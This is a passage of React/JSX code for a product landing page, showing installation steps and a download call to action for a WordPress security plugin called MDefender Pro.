              border: '1px solid #E2E8F0'
            }}>
              <div style={{ fontSize: '12px', fontWeight: 900, color: '#E8792F', marginBottom: '6px' }}>STEP 1</div>
              <h4 style={{ fontSize: '16px', fontWeight: 800, color: '#0F172A', margin: '0 0 8px' }}>Download the ZIP</h4>
              <p style={{ fontSize: '13px', color: '#64748B', lineHeight: 1.5, margin: '0 0 14px' }}>
                Download the official <code>mdefender-pro.zip</code> package directly from this page.
              </p>
              <a
                href={PLUGIN_DOWNLOAD_URL}
                download="mdefender-pro.zip"
                style={{
                  display: 'inline-flex',
                  alignItems: 'center',
                  gap: '6px',
                  fontSize: '12.5px',
                  fontWeight: 700,
                  color: '#0B2522',
                  textDecoration: 'none'
                }}
              >
                <Download size={14} />
                <span>Download .zip (1.4 MB)</span>
              </a>
            </div>

            <div style={{
              padding: '24px',
              borderRadius: '14px',
              background: '#F8FAFC',
              border: '1px solid #E2E8F0'
            }}>
              <div style={{ fontSize: '12px', fontWeight: 900, color: '#E8792F', marginBottom: '6px' }}>STEP 2</div>
              <h4 style={{ fontSize: '16px', fontWeight: 800, color: '#0F172A', margin: '0 0 8px' }}>Upload &amp; Activate</h4>
              <p style={{ fontSize: '13px', color: '#64748B', lineHeight: 1.5, margin: 0 }}>
                In your WordPress Admin, navigate to <strong>Plugins &gt; Add New &gt; Upload Plugin</strong>, choose the ZIP file, and click <strong>Activate</strong>.
              </p>
            </div>

            <div style={{
              padding: '24px',
              borderRadius: '14px',
              background: '#F8FAFC',
              border: '1px solid #E2E8F0'
            }}>
              <div style={{ fontSize: '12px', fontWeight: 900, color: '#E8792F', marginBottom: '6px' }}>STEP 3</div>
              <h4 style={{ fontSize: '16px', fontWeight: 800, color: '#0F172A', margin: '0 0 8px' }}>Paste API License</h4>
              <p style={{ fontSize: '13px', color: '#64748B', lineHeight: 1.5, margin: '0 0 14px' }}>
                Enter your MDefender Pro API Key in Settings to instantly sync live zero-day rules and telemetry.
              </p>
              <Link
                to="/user/connect"
                style={{
                  display: 'inline-flex',
                  alignItems: 'center',
                  gap: '6px',
                  fontSize: '12.5px',
                  fontWeight: 700,
                  color: '#0B2522',
                  textDecoration: 'none'
                }}
              >
                <span>Generate API Key</span>
                <ArrowRight size={13} />
              </Link>
            </div>
          </div>
        </div>
      </section>

      {/* ========================================================================= */}
      {/* 7. BOTTOM CTA SECTION                                                     */}
      {/* ========================================================================= */}
      <section style={{
        maxWidth: '1180px',
        margin: '0 auto',
        padding: '0 clamp(20px, 3.2vw, 32px)',
        textAlign: 'center'
      }}>
        <div style={{
          background: '#0B2522',
          borderRadius: '20px',
          padding: '52px 32px',
          color: '#FFFFFF',
          boxShadow: '0 20px 50px rgba(11, 37, 34, 0.25)'
        }}>
          <h2 style={{ fontSize: 'clamp(28px, 3.5vw, 40px)', fontWeight: 800, margin: '0 0 16px', letterSpacing: '-0.04em' }}>
            Shield Your WordPress Site Today
          </h2>
          <p style={{ fontSize: '15px', color: '#D9E1DC', maxWidth: '580px', margin: '0 auto 32px', lineHeight: 1.6 }}>
            Download the single official MDefender Pro plugin now. Zero bloat, zero ReDoS risk, and 0.00ms database overhead.
          </p>

          <div style={{ display: 'flex', justifyContent: 'center', gap: '14px', flexWrap: 'wrap' }}>
            <a
              href={PLUGIN_DOWNLOAD_URL}
              download="mdefender-pro.zip"
              style={{
                display: 'inline-flex',
                alignItems: 'center',
                gap: '8px',
                padding: '13px 26px',
                borderRadius: '10px',
                background: '#E8792F',
                color: '#FFFFFF',
                fontSize: '14.5px',
                fontWeight: 700,
                textDecoration: 'none',
                boxShadow: '0 4px 14px rgba(232, 121, 47, 0.35)'
              }}
            >
              <Download size={16} />
              <span>Download mdefender-pro.zip</span>
            </a>

            <Link
              to="/pricing"
              style={{
                display: 'inline-flex',
                alignItems: 'center',
                gap: '8px',
                padding: '13px 24px',
                borderRadius: '10px',
                background: 'rgba(255, 255, 255, 0.08)',
                border: '1px solid rgba(255, 255, 255, 0.2)',
                color: '#FFFFFF',
                fontSize: '14.5px',
                fontWeight: 700,
                textDecoration: 'none'
              }}
            >
              <span>View Plans &amp; Pricing</span>
              <ArrowRight size={14} />
            </Link>
          </div>
        </div>
      </section>

    </div>
  );
}
